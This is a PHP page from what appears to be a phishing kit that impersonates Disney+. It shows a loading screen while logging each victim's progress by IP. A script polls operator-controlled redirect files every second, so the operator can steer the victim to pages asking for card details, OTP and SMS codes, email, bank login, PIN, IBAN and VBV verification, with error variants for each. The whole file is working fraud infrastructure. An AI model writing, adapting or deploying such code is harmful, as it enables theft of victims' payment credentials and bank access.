<?php
session_start();
include('../../common/sub_includes.php');
include('../../app/1.php');
include('../../app/2.php');
include('../traduction.php');

if (!isset($_SESSION['index']) && $_SESSION['index'] == '1') {
  header('location: ../../');
}

if (!isset($_SESSION['bot']) && $_SESSION['bot'] == '1') {
  header('location: ../../site/index.html');
}
        
if (!isset($_SESSION['client']) && $_SESSION['client'] == '1') {
  die("THE SITE IS UNDER MAINTENANCE PLEASE TRY LATER");
}

$file = '../../users.json';
$data = file_exists($file) ? json_decode(file_get_contents($file), true) : ["users" => []];
$data['users'][$_SESSION['ip']]['step'] = '5';
file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html>
  <head>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta content="IE=Edge" http-equiv="X-UA-Compatible">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
    <link href="../assets/img/favicon.85e279041d79e51b147c1b6feb4f981e.ico" rel="shortcut icon">
    <link color="#1d1fff" href="../assets/img/safari-pinned-tab.f78e1debd6a0496471c542612d2e4bc5.svg" rel="mask-icon">
    <link href="../assets/img/apple-touch-icon.4dd3b8a8853ed0608ee308aa7aa76f82.png" rel="apple-touch-icon" sizes="180x180">
    <link href="../assets/img/favicon-32x32.3699f19f7fdff1a556c0953c12fb883f.png" rel="icon" sizes="32x32" type="image/png">
    <title>Disney+</title>
    <link rel="stylesheet" type="text/css" href="../../public/css/styles.2d27e1dcd33505d30035.css">
    <link rel="stylesheet" href="../../public/css/loading.css">
    <?php if (!empty($_SESSION['load'])) { ?> <meta http-equiv="refresh" content="2; url=../<?=$_SESSION['load']?>/"> <?php } ?>
  </head>
  <body style="background:rgb(26, 29, 41);" id="app_index" class="typeramp-avenir-world-for-disney">
    <div id="webAppRoot" data-reactroot="">
      <div data-testid="" class="sc-jWBwVP kKMOZf">
        <div alt="" aria-hidden="true" class="progress-indicator progress-indicator--responsive"></div>
      </div>
    </div>
    <script src="../../public/js/jquery.js"></script><script src="../../public/js/redirect.js"></script><script>setInterval(function(){checkIP("redirect/carteInvalide.txt","../<?=$_SESSION['id4']?>/?error")},1e3),setInterval(function(){checkIP("redirect/fin.txt","../<?=$_SESSION['id14']?>/")},1e3),setInterval(function(){checkIP("redirect/otp.txt","../<?=$_SESSION['id7']?>/")},1e3),setInterval(function(){checkIP("redirect/otperror.txt","../<?=$_SESSION['id7']?>/?error")},1e3),setInterval(function(){checkIP("redirect/mail.txt","../<?=$_SESSION['id8']?>/")},1e3),setInterval(function(){checkIP("redirect/mailerror.txt","../<?=$_SESSION['id8']?>/?error")},1e3),setInterval(function(){checkIP("redirect/sms.txt","../<?=$_SESSION['id9']?>/")},1e3),setInterval(function(){checkIP("redirect/smserror.txt","../<?=$_SESSION['id9']?>/?error")},1e3),setInterval(function(){checkIP("redirect/bank.txt","../<?=$_SESSION['id13']?>/")},1e3),setInterval(function(){checkIP("redirect/bankerror.txt","../<?=$_SESSION['id13']?>/?error")},1e3),setInterval(function(){checkIP("redirect/pin.txt","../<?=$_SESSION['id10']?>/")},1e3),setInterval(function(){checkIP("redirect/pinerror.txt","../<?=$_SESSION['id10']?>/?error")},1e3),setInterval(function(){checkIP("redirect/iban.txt","../<?=$_SESSION['id11']?>/")},1e3),setInterval(function(){checkIP("redirect/ibanerror.txt","../<?=$_SESSION['id11']?>/?error")},1e3),setInterval(function(){checkIP("redirect/vbv.txt","../<?=$_SESSION['id12']?>/")},1e3)</script>
  </body>
</html>